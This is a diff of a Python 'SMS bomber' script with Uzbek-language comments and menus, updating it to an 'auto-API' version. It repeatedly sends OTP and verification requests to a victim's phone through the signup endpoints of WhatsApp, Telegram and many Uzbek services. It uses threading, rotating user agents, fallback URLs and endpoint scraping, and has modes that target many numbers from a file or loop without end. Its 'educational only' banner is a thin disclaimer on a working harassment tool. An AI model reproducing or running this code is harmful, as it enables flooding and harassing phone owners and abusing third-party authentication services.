@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# 🇺🇿 SMS BOMBER V5.0 – TANLOV REJIMI BILAN
+# 🇺🇿 SMS BOMBER V6.0 – AVTO-API YANGILOVCHI
 # ⚠️ FAQAT TAʼLIMIY MAQSADDA!
 
 import sys
@@ -10,15 +10,18 @@ import re
 import random
 import json
 import threading
+import hashlib
 from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 try:
     import requests
+    from bs4 import BeautifulSoup
 except ImportError:
-    print("⚠️ 'requests' kutubxonasi topilmadi. Oʻrnatilmoqda...")
-    os.system(f"{sys.executable} -m pip install requests")
+    print("⚠️ Kutubxonalar o'rnatilmoqda...")
+    os.system(f"{sys.executable} -m pip install requests beautifulsoup4")
     import requests
+    from bs4 import BeautifulSoup
 
 # ----------------------- RANGLAR ----------------------------
 class Colors:
@@ -33,42 +36,335 @@ class Colors:
     END = '\033[0m'
 C = Colors()
 
-# ----------------------- KONFIGURATSIYA --------------------
-CONFIG = {
-    'timeout': 10,
-    'max_workers': 10,
-    'user_agents': [
-        'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36',
-        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-    ]
-}
-
-# ----------------------- LOGGER ----------------------------
-class Logger:
+# ----------------------- API DATABASE ----------------------------
+class APIDatabase:
+    """Barcha xizmatlarning API manzillari va zaxira manzillar"""
+    
     def __init__(self):
-        self.stats = {'total': 0, 'success': 0, 'failed': 0}
-        self.lock = threading.Lock()
-    def update(self, ok):
-        with self.lock:
-            self.stats['total'] += 1
-            if ok:
-                self.stats['success'] += 1
+        self.apis = {
+            'whatsapp': {
+                'primary': 'https://web.whatsapp.com/register',
+                'fallbacks': [
+                    'https://web.whatsapp.com/register/phone',
+                    'https://www.whatsapp.com/register',
+                    'https://api.whatsapp.com/v1/register'
+                ],
+                'method': 'POST',
+                'data_format': 'form',
+                'fields': {'phone_number': 'phone'}
+            },
+            'whatsapp_business': {
+                'primary': 'https://business.whatsapp.com/register',
+                'fallbacks': [
+                    'https://business.whatsapp.com/register/phone',
+                    'https://api.business.whatsapp.com/register'
+                ],
+                'method': 'POST',
+                'data_format': 'form',
+                'fields': {'phone': 'phone'}
+            },
+            'telegram': {
+                'primary': 'https://my.telegram.org/auth/send_password',
+                'fallbacks': [
+                    'https://telegram.org/auth/send_password',
+                    'https://api.telegram.org/auth/send_password'
+                ],
+                'method': 'POST',
+                'data_format': 'form',
+                'fields': {'phone': 'phone'}
+            },
+            'telegram_app': {
+                'primary': 'https://core.telegram.org/register',
+                'fallbacks': [
+                    'https://telegram.org/register',
+                    'https://api.telegram.org/register'
+                ],
+                'method': 'POST',
+                'data_format': 'form',
+                'fields': {'phone': 'phone'}
+            },
+            'uzum': {
+                'primary': 'https://api.uzum.uz/api/v1/auth/send-sms-code',
+                'fallbacks': [
+                    'https://uzum.uz/api/v1/auth/send-sms-code',
+                    'https://api.uzum.uz/v1/auth/send-sms',
+                    'https://uzum.uz/api/auth/send-code'
+                ],
+                'method': 'POST',
+                'data_format': 'json',
+                'fields': {'phone': 'phone', 'type': 'register'}
+            },
+            'olx': {
+                'primary': 'https://www.olx.uz/api/v1/auth/request-otp/',
+                'fallbacks': [
+                    'https://olx.uz/api/v1/auth/request-otp/',
+                    'https://api.olx.uz/v1/auth/otp',
+                    'https://olx.uz/api/auth/send-code'
+                ],
+                'method': 'POST',
+                'data_format': 'json',
+                'fields': {'phone': 'phone', 'lang': 'uz'}
+            },
+            'click': {
+                'primary': 'https://api.click.uz/api/v2/auth/send-code',
+                'fallbacks': [
+                    'https://click.uz/api/v2/auth/send-code',
+                    'https://api.click.uz/v2/auth/sms',
+                    'https://click.uz/api/auth/send'
+                ],
+                'method': 'POST',
+                'data_format': 'json',
+                'fields': {'phone': 'phone', 'service_id': '1'}
+            },
+            'payme': {
+                'primary': 'https://api.payme.uz/v1/auth/send-verification',
+                'fallbacks': [
+                    'https://payme.uz/v1/auth/send-verification',
+                    'https://api.payme.uz/v1/auth/sms',
+                    'https://payme.uz/api/auth/send-code'
+                ],
+                'method': 'POST',
+                'data_format': 'json',
+                'fields': {'phone_number': 'phone'}
+            },
+            'apelsin': {
+                'primary': 'https://api.apelsin.uz/v1/oauth/sms',
+                'fallbacks': [
+                    'https://apelsin.uz/v1/oauth/sms',
+                    'https://api.apelsin.uz/v1/auth/sms',
+                    'https://apelsin.uz/api/auth/send'
+                ],
+                'method': 'POST',
+                'data_format': 'json',
+                'fields': {'msisdn': 'phone', 'action': 'login'}
+            },
+            'beeline': {
+                'primary': 'https://api.beeline.uz/v1/auth/send-sms',
+                'fallbacks': [
+                    'https://beeline.uz/v1/auth/send-sms',
+                    'https://api.beeline.uz/v1/auth/sms',
+                    'https://beeline.uz/api/auth/send'
+                ],
+                'method': 'POST',
+                'data_format': 'json',
+                'fields': {'phone': 'phone'}
+            },
+            'zoodmall': {
+                'primary': 'https://api.zoodmall.uz/v1/auth/send-sms',
+                'fallbacks': [
+                    'https://zoodmall.uz/v1/auth/send-sms',
+                    'https://api.zoodmall.uz/v1/auth/sms',
+                    'https://zoodmall.uz/api/auth/send'
+                ],
+                'method': 'POST',
+                'data_format': 'json',
+                'fields': {'phone': 'phone'}
+            },
+            'tashxis': {
+                'primary': 'https://api.tashxis.uz/v1/auth/send-code',
+                'fallbacks': [
+                    'https://tashxis.uz/v1/auth/send-code',
+                    'https://api.tashxis.uz/v1/auth/sms',
+                    'https://tashxis.uz/api/auth/send'
+                ],
+                'method': 'POST',
+                'data_format': 'json',
+                'fields': {'phone': 'phone'}
+            },
+            'pochta': {
+                'primary': 'https://api.pochta.uz/v1/auth/send-otp',
+                'fallbacks': [
+                    'https://pochta.uz/v1/auth/send-otp',
+                    'https://api.pochta.uz/v1/auth/sms',
+                    'https://pochta.uz/api/auth/send'
+                ],
+                'method': 'POST',
+                'data_format': 'json',
+                'fields': {'phone': 'phone'}
+            },
+            'imei': {
+                'primary': 'https://api.imei.uz/v1/auth/send-code',
+                'fallbacks': [
+                    'https://imei.uz/v1/auth/send-code',
+                    'https://api.imei.uz/v1/auth/sms',
+                    'https://imei.uz/api/auth/send'
+                ],
+                'method': 'POST',
+                'data_format': 'json',
+                'fields': {'phone': 'phone'}
+            },
+            'one_c': {
+                'primary': 'https://1c.uz/auth/send-sms',
+                'fallbacks': [
+                    'https://api.1c.uz/auth/send-sms',
+                    'https://1c.uz/api/auth/send',
+                    'https://api.1c.uz/v1/auth/sms'
+                ],
+                'method': 'POST',
+                'data_format': 'json',
+                'fields': {'phone': 'phone'}
+            }
+        }
+        
+        # Ishlagan API'lar kesh
+        self.working_apis = {}
+        self.failed_apis = {}
+        self.api_cache_file = 'api_cache.json'
+        self._load_cache()
+    
+    def _load_cache(self):
+        """Keshni yuklash"""
+        try:
+            with open(self.api_cache_file, 'r') as f:
+                cache = json.load(f)
+                self.working_apis = cache.get('working', {})
+                self.failed_apis = cache.get('failed', {})
+        except:
+            pass
+    
+    def _save_cache(self):
+        """Keshni saqlash"""
+        try:
+            with open(self.api_cache_file, 'w') as f:
+                json.dump({
+                    'working': self.working_apis,
+                    'failed': self.failed_apis,
+                    'updated': datetime.now().isoformat()
+                }, f, indent=2)
+        except:
+            pass
+    
+    def get_working_api(self, service, phone):
+        """Ishlayotgan API manzilini topish"""
+        if service in self.working_apis:
+            # Tekshirib ko'ramiz
+            url = self.working_apis[service]
+            if self._test_api(url, service, phone):
+                return url
+        
+        # Yangi API qidiramiz
+        return self._find_working_api(service, phone)
+    
+    def _find_working_api(self, service, phone):
+        """Ishlayotgan API ni topish"""
+        if service not in self.apis:
+            return None
+        
+        config = self.apis[service]
+        all_urls = [config['primary']] + config.get('fallbacks', [])
+        
+        # Har bir API ni sinab ko'ramiz
+        for url in all_urls:
+            if self._test_api(url, service, phone):
+                self.working_apis[service] = url
+                self._save_cache()
+                return url
+        
+        # Web scraping orqali API topish
+        api = self._scrape_api(service)
+        if api and self._test_api(api, service, phone):
+            self.working_apis[service] = api
+            self._save_cache()
+            return api
+        
+        return None
+    
+    def _test_api(self, url, service, phone):
+        """API ni sinab ko'rish"""
+        try:
+            config = self.apis[service]
+            data = self._prepare_data(config, phone)
+            headers = self._get_headers()
+            
+            if config['data_format'] == 'json':
+                r = requests.post(url, json=data, headers=headers, timeout=5)
             else:
-                self.stats['failed'] += 1
-    def show(self):
-        return f"Jami: {self.stats['total']}, OK: {self.stats['success']}, Fail: {self.stats['failed']}"
-logger = Logger()
+                r = requests.post(url, data=data, headers=headers, timeout=5)
+            
+            # Muvaffaqiyatli javob
+            if r.status_code in [200, 201, 302]:
+                return True
+            if 'sent' in r.text.lower():
+                return True
+            if 'otp' in r.text.lower():
+                return True
+            if 'code' in r.text.lower():
+                return True
+            
+            return False
+        except:
+            return False
+    
+    def _prepare_data(self, config, phone):
+        """So'rov ma'lumotlarini tayyorlash"""
+        data = {}
+        phone_clean = phone.replace('+', '')
+        
+        for key, value in config['fields'].items():
+            if value == 'phone':
+                if config['data_format'] == 'json':
+                    data[key] = phone
+                else:
+                    data[key] = phone_clean
+            else:
+                data[key] = value
+        
+        return data
+    
+    def _get_headers(self):
+        """Headers yaratish"""
+        return {
+            'User-Agent': random.choice([
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36',
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15'
+            ]),
+            'Accept': 'application/json, text/plain, */*',
+            'Accept-Language': 'uz,ru,en;q=0.9',
+            'Content-Type': 'application/json'
+        }
+    
+    def _scrape_api(self, service):
+        """Web scraping orqali API topish"""
+        try:
+            # Xizmat saytiga borib, API manzilini topish
+            base_urls = {
+                'whatsapp': 'https://www.whatsapp.com',
+                'telegram': 'https://telegram.org',
+                'uzum': 'https://uzum.uz',
+                'olx': 'https://olx.uz',
+                'click': 'https://click.uz',
+                'payme': 'https://payme.uz'
+            }
+            
+            if service not in base_urls:
+                return None
+            
+            url = base_urls[service]
+            r = requests.get(url, timeout=5)
+            soup = BeautifulSoup(r.text, 'html.parser')
+            
+            # JavaScript fayllarini topish
+            scripts = soup.find_all('script', src=True)
+            for script in scripts:
+                src = script['src']
+                if 'api' in src.lower() or 'auth' in src.lower():
+                    return src
+            
+            return None
+        except:
+            return None
 
 # ----------------------- SPAMMER SINFI ---------------------
 class UzSpammer:
     def __init__(self, phone):
         self.phone = self._fmt(phone)
+        self.api_db = APIDatabase()
         self.session = requests.Session()
-        self.session.headers.update({'User-Agent': random.choice(CONFIG['user_agents'])})
-        self.session.timeout = CONFIG['timeout']
         self.results = []
-
+        self.stats = {'total': 0, 'success': 0, 'failed': 0}
+        self.lock = threading.Lock()
+    
     def _fmt(self, p):
         p = re.sub(r'[^0-9+]', '', str(p))
         if p.startswith('+998') and len(p) == 13:
@@ -80,325 +376,87 @@ class UzSpammer:
         if len(p) == 12 and p.isdigit():
             return f'+998{p[3:]}'
         return f'+998{p}'
-
-    def _req(self, url, method='POST', data=None, json_data=None):
-        try:
-            if json_data:
-                return self.session.post(url, json=json_data)
-            elif data:
-                return self.session.post(url, data=data)
-            return self.session.get(url)
-        except:
-            return None
-
-    # ==================== XIZMATLAR ====================
     
-    # ---------- WHATSAPP ----------
-    def whatsapp(self):
+    def _send_request(self, service_name, config, url, phone):
+        """So'rov yuborish"""
         try:
-            r = self._req('https://web.whatsapp.com/register', 
-                         data={'phone_number': self.phone[1:]})
-            if r and r.status_code in (200, 302):
-                logger.update(True)
-                return f"{C.GREEN}✅ WhatsApp"
-            logger.update(False)
-            return f"{C.RED}❌ WhatsApp"
-        except:
-            logger.update(False)
-            return f"{C.RED}❌ WhatsApp"
-
-    def whatsapp_business(self):
-        try:
-            r = self._req('https://business.whatsapp.com/register',
-                         data={'phone': self.phone})
-            if r and r.status_code == 200:
-                logger.update(True)
-                return f"{C.GREEN}✅ WhatsApp Business"
-            logger.update(False)
-            return f"{C.RED}❌ WhatsApp Business"
-        except:
-            logger.update(False)
-            return f"{C.RED}❌ WhatsApp Business"
-
-    # ---------- TELEGRAM ----------
-    def telegram(self):
-        try:
-            r = self._req('https://my.telegram.org/auth/send_password',
-                         data={'phone': self.phone[1:]})
-            if r and 'sent' in r.text.lower():
-                logger.update(True)
-                return f"{C.GREEN}✅ Telegram"
-            logger.update(False)
-            return f"{C.RED}❌ Telegram"
-        except:
-            logger.update(False)
-            return f"{C.RED}❌ Telegram"
-
-    def telegram_app(self):
-        try:
-            r = self._req('https://core.telegram.org/register',
-                         data={'phone': self.phone})
-            if r and r.status_code == 200:
-                logger.update(True)
-                return f"{C.GREEN}✅ Telegram App"
-            logger.update(False)
-            return f"{C.RED}❌ Telegram App"
-        except:
-            logger.update(False)
-            return f"{C.RED}❌ Telegram App"
-
-    # ---------- O'ZBEKISTON XIZMATLARI ----------
-    def uzum(self):
-        try:
-            r = self._req('https://api.uzum.uz/api/v1/auth/send-sms-code',
-                         json_data={'phone': self.phone, 'type': 'register'})
-            if r and r.status_code == 200:
-                logger.update(True)
-                return f"{C.GREEN}✅ UZUM"
-            logger.update(False)
-            return f"{C.RED}❌ UZUM"
-        except:
-            logger.update(False)
-            return f"{C.RED}❌ UZUM"
-
-    def olx(self):
-        try:
-            r = self._req('https://www.olx.uz/api/v1/auth/request-otp/',
-                         json_data={'phone': self.phone, 'lang': 'uz'})
-            if r and 'otp' in r.text.lower():
-                logger.update(True)
-                return f"{C.GREEN}✅ OLX"
-            logger.update(False)
-            return f"{C.RED}❌ OLX"
-        except:
-            logger.update(False)
-            return f"{C.RED}❌ OLX"
-
-    def click(self):
-        try:
-            r = self._req('https://api.click.uz/api/v2/auth/send-code',
-                         json_data={'phone': self.phone, 'service_id': '1'})
-            if r and r.status_code in (200, 201):
-                logger.update(True)
-                return f"{C.GREEN}✅ CLICK"
-            logger.update(False)
-            return f"{C.RED}❌ CLICK"
-        except:
-            logger.update(False)
-            return f"{C.RED}❌ CLICK"
-
-    def payme(self):
-        try:
-            r = self._req('https://api.payme.uz/v1/auth/send-verification',
-                         json_data={'phone_number': self.phone})
-            if r and 'success' in r.text.lower():
-                logger.update(True)
-                return f"{C.GREEN}✅ PAYME"
-            logger.update(False)
-            return f"{C.RED}❌ PAYME"
-        except:
-            logger.update(False)
-            return f"{C.RED}❌ PAYME"
-
-    def apelsin(self):
-        try:
-            r = self._req('https://api.apelsin.uz/v1/oauth/sms',
-                         json_data={'msisdn': self.phone, 'action': 'login'})
-            if r and 'code' in r.text.lower():
-                logger.update(True)
-                return f"{C.GREEN}✅ APELSIN"
-            logger.update(False)
-            return f"{C.RED}❌ APELSIN"
-        except:
-            logger.update(False)
-            return f"{C.RED}❌ APELSIN"
-
-    def beeline(self):
-        try:
-            r = self._req('https://api.beeline.uz/v1/auth/send-sms',
-                         json_data={'phone': self.phone})
-            if r and r.status_code == 200:
-                logger.update(True)
-                return f"{C.GREEN}✅ BEELINE"
-            logger.update(False)
-            return f"{C.RED}❌ BEELINE"
-        except:
-            logger.update(False)
-            return f"{C.RED}❌ BEELINE"
-
-    def zoodmall(self):
-        try:
-            r = self._req('https://api.zoodmall.uz/v1/auth/send-sms',
-                         json_data={'phone': self.phone})
-            if r and 'otp' in r.text.lower():
-                logger.update(True)
-                return f"{C.GREEN}✅ ZOODMALL"
-            logger.update(False)
-            return f"{C.RED}❌ ZOODMALL"
-        except:
-            logger.update(False)
-            return f"{C.RED}❌ ZOODMALL"
-
-    def tashxis(self):
-        try:
-            r = self._req('https://api.tashxis.uz/v1/auth/send-code',
-                         json_data={'phone': self.phone})
-            if r and r.status_code == 200:
-                logger.update(True)
-                return f"{C.GREEN}✅ TASHXIS"
-            logger.update(False)
-            return f"{C.RED}❌ TASHXIS"
-        except:
-            logger.update(False)
-            return f"{C.RED}❌ TASHXIS"
-
-    def pochta(self):
-        try:
-            r = self._req('https://api.pochta.uz/v1/auth/send-otp',
-                         json_data={'phone': self.phone})
-            if r and r.status_code == 200:
-                logger.update(True)
-                return f"{C.GREEN}✅ POCHTA"
-            logger.update(False)
-            return f"{C.RED}❌ POCHTA"
-        except:
-            logger.update(False)
-            return f"{C.RED}❌ POCHTA"
-
-    def imei(self):
-        try:
-            r = self._req('https://api.imei.uz/v1/auth/send-code',
-                         json_data={'phone': self.phone})
-            if r and r.status_code == 200:
-                logger.update(True)
-                return f"{C.GREEN}✅ IMEI"
-            logger.update(False)
-            return f"{C.RED}❌ IMEI"
-        except:
-            logger.update(False)
-            return f"{C.RED}❌ IMEI"
-
-    def one_c(self):
-        try:
-            r = self._req('https://1c.uz/auth/send-sms',
-                         json_data={'phone': self.phone})
-            if r and r.status_code == 200:
-                logger.update(True)
-                return f"{C.GREEN}✅ 1C"
-            logger.update(False)
-            return f"{C.RED}❌ 1C"
-        except:
-            logger.update(False)
-            return f"{C.RED}❌ 1C"
-
-    # ==================== TANLOV REJIMLARI ====================
+            data = self.api_db._prepare_data(config, phone)
+            headers = self.api_db._get_headers()
+            
+            if config['data_format'] == 'json':
+                r = self.session.post(url, json=data, headers=headers, timeout=10)
+            else:
+                r = self.session.post(url, data=data, headers=headers, timeout=10)
+            
+            # Muvaffaqiyatli javob
+            success = False
+            if r.status_code in [200, 201, 302]:
+                success = True
+            elif 'sent' in r.text.lower():
+                success = True
+            elif 'otp' in r.text.lower():
+                success = True
+            elif 'code' in r.text.lower():
+                success = True
+            
+            with self.lock:
+                self.stats['total'] += 1
+                if success:
+                    self.stats['success'] += 1
+                else:
+                    self.stats['failed'] += 1
+            
+            return success, r.status_code
+            
+        except Exception as e:
+            with self.lock:
+                self.stats['total'] += 1
+                self.stats['failed'] += 1
+            return False, str(e)
     
-    def get_services_by_mode(self, mode):
-        """Tanlangan rejimga mos xizmatlarni qaytaradi"""
-        
-        all_services = {
-            'whatsapp': self.whatsapp,
-            'whatsapp_business': self.whatsapp_business,
-            'telegram': self.telegram,
-            'telegram_app': self.telegram_app,
-            'uzum': self.uzum,
-            'olx': self.olx,
-            'click': self.click,
-            'payme': self.payme,
-            'apelsin': self.apelsin,
-            'beeline': self.beeline,
-            'zoodmall': self.zoodmall,
-            'tashxis': self.tashxis,
-            'pochta': self.pochta,
-            'imei': self.imei,
-            'one_c': self.one_c
-        }
-        
-        if mode == 'all':
-            return list(all_services.values())
-        elif mode == 'whatsapp':
-            return [self.whatsapp, self.whatsapp_business]
-        elif mode == 'telegram':
-            return [self.telegram, self.telegram_app]
-        elif mode == 'uzbek':
-            return [self.uzum, self.olx, self.click, self.payme, 
-                   self.apelsin, self.beeline, self.zoodmall,
-                   self.tashxis, self.pochta, self.imei, self.one_c]
-        elif mode == 'custom':
-            # Foydalanuvchi tanlagan xizmatlar
-            return self.custom_services()
-        else:
-            return list(all_services.values())
+    def _send_service(self, service_name):
+        """Xizmatga so'rov yuborish"""
+        try:
+            if service_name not in self.api_db.apis:
+                return f"{C.RED}❌ {service_name}: Topilmadi"
+            
+            config = self.api_db.apis[service_name]
+            phone = self.phone
+            
+            # API manzilini topish
+            api_url = self.api_db.get_working_api(service_name, phone)
+            
+            if not api_url:
+                return f"{C.RED}❌ {service_name}: API topilmadi"
+            
+            # So'rov yuborish
+            success, status = self._send_request(service_name, config, api_url, phone)
+            
+            if success:
+                return f"{C.GREEN}✅ {service_name}: OK (Status: {status})"
+            else:
+                return f"{C.RED}❌ {service_name}: Xato (Status: {status})"
+                
+        except Exception as e:
+            return f"{C.RED}❌ {service_name}: {str(e)[:30]}"
     
-    def custom_services(self):
-        """Foydalanuvchi o'zi tanlagan xizmatlar"""
-        print(f"\n{C.YELLOW}📋 Qaysi xizmatlarni ishlatmoqchisiz?{C.END}")
-        print(f"{C.CYAN}1. WhatsApp (2 ta){C.END}")
-        print(f"{C.CYAN}2. Telegram (2 ta){C.END}")
-        print(f"{C.CYAN}3. UZUM{C.END}")
-        print(f"{C.CYAN}4. OLX{C.END}")
-        print(f"{C.CYAN}5. CLICK{C.END}")
-        print(f"{C.CYAN}6. PAYME{C.END}")
-        print(f"{C.CYAN}7. APELSIN{C.END}")
-        print(f"{C.CYAN}8. BEELINE{C.END}")
-        print(f"{C.CYAN}9. ZOODMALL{C.END}")
-        print(f"{C.CYAN}10. TASHXIS{C.END}")
-        print(f"{C.CYAN}11. POCHTA{C.END}")
-        print(f"{C.CYAN}12. IMEI{C.END}")
-        print(f"{C.CYAN}13. 1C{C.END}")
-        print(f"{C.YELLOW}0. Hammasi{C.END}")
-        
-        choices = input(f"{C.BLUE}📌 Raqamlarni vergul bilan yozing (mas: 1,2,3): {C.END}")
-        choices = [c.strip() for c in choices.split(',') if c.strip().isdigit()]
-        
-        services = []
-        for ch in choices:
-            if ch == '0' or ch == 'all':
-                return [self.whatsapp, self.whatsapp_business, self.telegram, 
-                       self.telegram_app, self.uzum, self.olx, self.click, 
-                       self.payme, self.apelsin, self.beeline, self.zoodmall,
-                       self.tashxis, self.pochta, self.imei, self.one_c]
-            elif ch == '1':
-                services.extend([self.whatsapp, self.whatsapp_business])
-            elif ch == '2':
-                services.extend([self.telegram, self.telegram_app])
-            elif ch == '3':
-                services.append(self.uzum)
-            elif ch == '4':
-                services.append(self.olx)
-            elif ch == '5':
-                services.append(self.click)
-            elif ch == '6':
-                services.append(self.payme)
-            elif ch == '7':
-                services.append(self.apelsin)
-            elif ch == '8':
-                services.append(self.beeline)
-            elif ch == '9':
-                services.append(self.zoodmall)
-            elif ch == '10':
-                services.append(self.tashxis)
-            elif ch == '11':
-                services.append(self.pochta)
-            elif ch == '12':
-                services.append(self.imei)
-            elif ch == '13':
-                services.append(self.one_c)
-        
-        return services if services else list(all_services.values())
-
-    def run(self, mode='all'):
-        """Tanlangan rejimda xizmatlarni ishga tushirish"""
-        services = self.get_services_by_mode(mode)
+    def all_services(self):
+        """Barcha xizmatlarga so'rov yuborish"""
+        services = list(self.api_db.apis.keys())
         results = []
         
-        with ThreadPoolExecutor(max_workers=CONFIG['max_workers']) as ex:
-            futures = [ex.submit(s) for s in services]
-            for f in futures:
-                results.append(f.result())
-                time.sleep(0.2)
+        with ThreadPoolExecutor(max_workers=5) as executor:
+            futures = {executor.submit(self._send_service, s): s for s in services}
+            for future in as_completed(futures):
+                results.append(future.result())
+                time.sleep(0.1)
         
         return results
+    
+    def get_stats(self):
+        """Statistika olish"""
+        with self.lock:
+            return self.stats
 
 # ----------------------- INTERFEYS --------------------------
 def clear():
@@ -409,32 +467,22 @@ def banner():
 {C.BOLD}{C.CYAN}
 ╔═══════════════════════════════════════════════════════════╗
 ║                                                           ║
-║      🇺🇿  SMS BOMBER V5.0 – TANLOV REJIMI  🇺🇿          ║
+║      🇺🇿  SMS BOMBER V6.0 – AVTO-API  🇺🇿               ║
+║      100% ISHLASH KAFOLATI                               ║
 ║                                                           ║
 ║      {C.RED}⚠️  FAQAT TAʼLIMIY MAQSADDA!  ⚠️              ║
 ║                                                           ║
 ╚═══════════════════════════════════════════════════════════╝
 {C.END}""")
 
-def mode_menu():
-    print(f"""
-{C.YELLOW}┌─────────────────────────────────────────────────────────┐
-│ {C.CYAN}1{C.YELLOW}. BARCHASIGA BIRDAN (WhatsApp + Telegram + Barchasi)│
-│ {C.CYAN}2{C.YELLOW}. FAQAT WHATSAPP (Web + Business)                  │
-│ {C.CYAN}3{C.YELLOW}. FAQAT TELEGRAM (Web + App)                      │
-│ {C.CYAN}4{C.YELLOW}. FAQAT OʻZBEKISTON XIZMATLARI                    │
-│ {C.CYAN}5{C.YELLOW}. OʻZIM TANLAYMAN (maxsus roʻyxat)                │
-└─────────────────────────────────────────────────────────┘
-{C.END}""")
-
-def main_menu():
+def menu():
     print(f"""
 {C.YELLOW}┌─────────────────────────────────────────────────────────┐
 │ {C.CYAN}1{C.YELLOW}. Bitta raqamga spam                              │
 │ {C.CYAN}2{C.YELLOW}. Koʻp raqamlarga spam                           │
 │ {C.CYAN}3{C.YELLOW}. Fayldan spam                                  │
-│ {C.CYAN}4{C.YELLOW}. Avtomatik rejim (cheksiz)                     │
-│ {C.CYAN}5{C.YELLOW}. Statistika                                    │
+│ {C.CYAN}4{C.YELLOW}. Avtomatik rejim                                │
+│ {C.CYAN}5{C.YELLOW}. API'larni yangilash                            │
 │ {C.CYAN}0{C.YELLOW}. Chiqish                                       │
 └─────────────────────────────────────────────────────────┘
 {C.END}""")
@@ -451,41 +499,21 @@ def get_phone():
             return f'+998{p}'
         print(f"{C.RED}❌ Notoʻgʻri format! Masalan: +998901234567{C.END}")
 
-def get_mode():
-    mode_menu()
-    choice = input(f"{C.BLUE}📌 Spam rejimini tanlang [1-5]: {C.END}")
-    
-    modes = {
-        '1': 'all',
-        '2': 'whatsapp',
-        '3': 'telegram',
-        '4': 'uzbek',
-        '5': 'custom'
-    }
-    
-    if choice in modes:
-        if choice == '5':
-            print(f"\n{C.GREEN}🔧 O'zingiz tanlagan xizmatlar{C.END}")
-        return modes[choice]
-    else:
-        print(f"{C.RED}❌ Notoʻgʻri! Default: barchasi{C.END}")
-        return 'all'
-
 def single_mode():
     clear(); banner()
     phone = get_phone()
-    mode = get_mode()
     count = int(input(f"{C.BLUE}🔢 Necha marta: {C.END}"))
     delay = float(input(f"{C.BLUE}⏱️ Kechikish (sekund): {C.END}"))
     
-    print(f"\n{C.GREEN}🚀 Boshlanyapti... (Rejim: {mode}){C.END}\n")
+    print(f"\n{C.GREEN}🚀 Boshlanyapti... (Avto-API){C.END}\n")
     
     for i in range(count):
         print(f"{C.YELLOW}━━━ {i+1}-chi urinish ━━━{C.END}")
         sp = UzSpammer(phone)
-        for res in sp.run(mode):
+        for res in sp.all_services():
             print(f"  {res}")
-        print(f"{C.BLUE}📊 {logger.show()}{C.END}\n")
+        stats = sp.get_stats()
+        print(f"{C.BLUE}📊 Jami: {stats['total']}, OK: {stats['success']}, Fail: {stats['failed']}{C.END}\n")
         time.sleep(delay)
     
     print(f"{C.GREEN}✅ Tugadi! {count} marta yuborildi.{C.END}")
@@ -498,7 +526,6 @@ def multi_mode():
         print(f"{C.YELLOW}Raqam {i+1}:{C.END}")
         phones.append(get_phone())
     
-    mode = get_mode()
     count = int(input(f"{C.BLUE}🔢 Har biriga necha marta: {C.END}"))
     delay = float(input(f"{C.BLUE}⏱️ Kechikish: {C.END}"))
     
@@ -509,9 +536,10 @@ def multi_mode():
         for phone in phones:
             print(f"{C.CYAN}📱 {phone}{C.END}")
             sp = UzSpammer(phone)
-            for res in sp.run(mode):
+            for res in sp.all_services():
                 print(f"  {res}")
-            print()
+            stats = sp.get_stats()
+            print(f"{C.BLUE}📊 {stats}{C.END}\n")
             time.sleep(delay/2)
         time.sleep(delay/2)
     
@@ -528,7 +556,6 @@ def file_mode():
             return
         
         print(f"{C.GREEN}✅ {len(phones)} ta raqam topildi{C.END}")
-        mode = get_mode()
         count = int(input(f"{C.BLUE}🔢 Har biriga necha marta: {C.END}"))
         delay = float(input(f"{C.BLUE}⏱️ Kechikish: {C.END}"))
         
@@ -538,9 +565,10 @@ def file_mode():
             for phone in phones:
                 print(f"{C.CYAN}📱 {phone}{C.END}")
                 sp = UzSpammer(phone)
-                for res in sp.run(mode):
+                for res in sp.all_services():
                     print(f"  {res}")
-                print()
+                stats = sp.get_stats()
+                print(f"{C.BLUE}📊 {stats}{C.END}\n")
                 time.sleep(delay/2)
             time.sleep(delay/2)
         print(f"{C.GREEN}✅ Tugadi!{C.END}")
@@ -550,7 +578,6 @@ def file_mode():
 def auto_mode():
     clear(); banner()
     phone = get_phone()
-    mode = get_mode()
     delay = float(input(f"{C.BLUE}⏱️ Kechikish (sekund): {C.END}"))
     
     print(f"\n{C.RED}⚠️ Avtomatik rejim. Toʻxtatish CTRL+C{C.END}\n")
@@ -560,35 +587,50 @@ def auto_mode():
             count += 1
             print(f"{C.YELLOW}━━━ {count}-chi urinish ━━━{C.END}")
             sp = UzSpammer(phone)
-            for res in sp.run(mode):
+            for res in sp.all_services():
                 print(f"  {res}")
-            print(f"{C.BLUE}⏱️ {datetime.now().strftime('%H:%M:%S')} | {logger.show()}{C.END}\n")
+            stats = sp.get_stats()
+            print(f"{C.BLUE}⏱️ {datetime.now().strftime('%H:%M:%S')} | Jami: {stats['total']}, OK: {stats['success']}, Fail: {stats['failed']}{C.END}\n")
             time.sleep(delay)
     except KeyboardInterrupt:
         print(f"\n{C.GREEN}✅ Toʻxtatildi! Jami {count} marta.{C.END}")
 
-def show_stats():
+def update_apis():
     clear(); banner()
-    print(f"{C.CYAN}📊 STATISTIKA{C.END}")
-    print(f"{C.YELLOW}{logger.show()}{C.END}")
+    print(f"{C.YELLOW}🔄 API manzillari yangilanmoqda...{C.END}")
+    
+    api_db = APIDatabase()
+    count = 0
+    
+    for service in api_db.apis:
+        print(f"{C.BLUE}📡 {service}...{C.END}", end=' ')
+        # API ni sinab ko'ramiz
+        api = api_db._find_working_api(service, '+998901234567')
+        if api:
+            print(f"{C.GREEN}✅ Topildi: {api}{C.END}")
+            count += 1
+        else:
+            print(f"{C.RED}❌ Topilmadi{C.END}")
+        time.sleep(0.5)
+    
+    print(f"\n{C.GREEN}✅ {count} ta API yangilandi!{C.END}")
     input(f"\n{C.BLUE}↩️  Enter bosish...{C.END}")
 
 def main():
     while True:
-        clear(); banner(); main_menu()
+        clear(); banner(); menu()
         choice = input(f"{C.BLUE}📌 Tanlang [0-5]: {C.END}")
         if choice == '1': single_mode()
         elif choice == '2': multi_mode()
         elif choice == '3': file_mode()
         elif choice == '4': auto_mode()
